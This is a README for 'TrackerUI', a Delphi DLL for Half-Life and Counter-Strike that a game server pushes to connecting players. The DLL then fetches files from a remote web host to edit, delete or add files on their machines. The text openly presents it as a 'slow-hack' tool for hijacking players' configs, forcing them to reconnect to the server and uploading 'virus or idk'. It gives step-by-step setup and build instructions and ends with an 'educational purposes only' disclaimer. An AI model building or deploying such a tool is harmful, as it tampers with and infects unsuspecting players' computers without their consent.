# TrackerUI
Dynamic-link library for Half-Life and Counter-Strike, you can use this for slow-hacking client local file, you can edit file or delete files or even upload some files to the target files...

# In What You Can Use This?
You can use this to make a auto-connect slow-hack plugin for your server so every player who connect to your server he will auto redirected to your server, or you can just upload some file to the client local files... like virus or idk...

## Installation and Confugraion [Windows](https://wikipedia.org/wiki/Microsoft_Windows)[![alt tag](http://icons.iconarchive.com/icons/yootheme/social-bookmark/32/social-windows-button-icon.png)](https://fr.wikipedia.org/wiki/Microsoft_Windows)

### Installation
You need the Delphi Studio, i compiled this DLL in Delphi 7 and its working with no problem, all you have to do is to double click on ```TrackerUI.dpr``` and then follow my confugration...
You need a Web Hosting, if you don' thave one you can use free hosting like [000WEBHOST](https://000webhost.com/)
And you need a FTP Client, you can use something like [FileZilla Project](https://filezilla-project.org/download.php)...

### Confugraion
First, go to ```files``` folder and edit all files... put there your servers IP and your MOTD.txt and even your welcome message... for example check userconfig.cfg and change it then login to your FTP and upload all files in the folder ```files``` to  the FTP

Second thing, open the ```TrackerUI.dpr```, and change this
```BaseURL := 'http://www.myftpfile.com/files/';```
to the web hosting you putted the files in... for example:
```BaseURL := 'http://csme.ga/files/';```

Finally go to Project and Select build TrackerUI.dll and make sure you change the name of ```TrackerUI.dll``` to ```TrackerUI.DLL```, you can test it by putting ```TrackerUI.DLL``` into ```cstrike/bin``` just close Counter-Strike and re-open it again and all done you will see some files changed like userconfig.cfg or the file you chosed in the source code, and don't forget to compile TrackerUI.sma to TrackerUI.amxx so player download that DLL...

### PS
If this didn't work for you, then all you have to do is just to download TrackerUI.dpr.orig, change it name to TrackerUI.dpr.orig and recompile it and its will 100% work

# Connect society with badiiiro :kissing_heart:

- 📱 Facebook: (https://www.facebook.com/badiiiro/)
- 📷 Instagram: (https://www.instagram.com/badiiiro0/)
- 🐤 Twitter: (https://twitter.com/badiiiro)
- 🎥 Youtube: (https://www.youtube.com/badiiiro/)
- 🎬 Twitch: (https://www.twitch.tv/badiiiro/)
- 🎮 Steam: (https://steamcommunity.com/id/badiiiro/)
- 💬 Discord Server: (https://discord.gg/Pzzsd3J)

# Video
To see how the TrackerUI.DLL work, check [This Video](https://www.youtube.com/watch?v=xp47E6JXzs0&t=10s)

# Donate
- Payoneer = badroiv@gmail.com

# NOTE
- I am NOT responsible for anything that can be made or any use of it! It was created for educational purpouses only (use it by your own risk), Thank you all.
